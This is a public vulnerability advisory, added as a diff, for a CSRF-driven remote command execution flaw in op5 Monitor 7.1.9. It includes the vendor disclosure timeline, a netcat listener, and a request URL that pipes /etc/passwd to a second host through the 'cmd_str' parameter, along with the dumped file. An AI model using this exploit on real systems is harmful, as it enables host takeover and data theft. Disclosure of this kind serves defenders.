@@ -1,0 +1,138 @@
+[+] Credits: hyp3rlinx
+
+[+] Website: http://hyp3rlinx.altervista.org
+
+[+] Source:
+http://hyp3rlinx.altervista.org/advisories/OP5-REMOTE-CMD-EXECUTION.txt
+
+
+Vendor:
+============
+www.op5.com
+
+
+Product:
+===========
+op5 v7.1.9
+
+op5 Monitor is a software product for server, Network monitoring and
+management based on the open source Project Nagios.
+
+
+Vulnerability Type:
+========================
+Remote Command Execution
+
+
+CVE Reference:
+==============
+N/A
+
+
+Vulnerability Details:
+=====================
+
+op5 has a CSRF entry point that can be used to execute arbitrary remote
+commands on op5 system sent via HTTP GET requests, allowing attackers
+to completely takeover the affected host, to be victimized a user must be
+authenticated and visit a malicious webpage or click an infected link...
+
+Reference:
+https://www.op5.com/blog/news/op5-monitor-7-2-0-release-notes/
+
+
+Exploit code(s):
+===============
+
+trivial RCE cat /etc/passwd... using netcat
+
+nc.exe  -vvlp 5555 > passwds.txt
+
+https://192.168.1.103/monitor/op5/nacoma/command_test.php?cmd_str=/bin/cat%20/etc/passwd%20|%20nc%20192.168.1.102%205555
+<https://192.168.1.103/monitor/op5/nacoma/command_test.php?cmd_str=/bin/cat%20/etc/passwd%20%7C%20nc%20192.168.1.102%205555>
+
+
+result:
+
+listening on [any] 5555 ...
+192.168.1.103: inverse host lookup failed: h_errno 11004: NO_DATA
+connect to [192.168.1.102] from (UNKNOWN) [192.168.1.103] 56935: NO_DAT
+ sent 0, rcvd 1343
+
+C:\netcat-win32-1.12>type passwds.txt
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
+abrt:x:173:173::/etc/abrt:/sbin/nologin
+apache:x:48:48:Apache:/var/www:/sbin/nologin
+smstools:x:499:499::/var/lib/smstools:/bin/bash
+postgres:x:26:26:PostgreSQL Server:/var/lib/pgsql:/bin/bash
+op5lsu:x:500:500::/home/op5lsu:/bin/bash
+saslauth:x:498:76:Saslauthd user:/var/empty/saslauth:/sbin/nologin
+postfix:x:89:89::/var/spool/postfix:/sbin/nologin
+haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
+monitor:x:299:48::/opt/monitor:/bin/bash
+ntp:x:38:38::/etc/ntp:/sbin/nologin
+mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+tcpdump:x:72:72::/:/sbin/nologin
+
+
+
+Disclosure Timeline:
+============================================
+Vendor Notification:  March 27, 2016
+Vendor confirms vulnerability March 27, 2016
+Vendor issue patched new release v7.2.0 April 5, 2016
+April 6, 2016  : Public Disclosure
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+================
+High
+
+
+Description:
+=================================================================
+
+
+Request Method(s):        [+] GET
+
+
+Vulnerable Product:       [+] op5 v7.1.9
+
+
+Vulnerable Parameter(s):  [+] 'cmd_str'
+
+=================================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author.
+The author is not responsible for any misuse of the information contained
+herein and prohibits any malicious use of all security related information
+or exploits by the author or elsewhere.
+
+hyp3rlinx
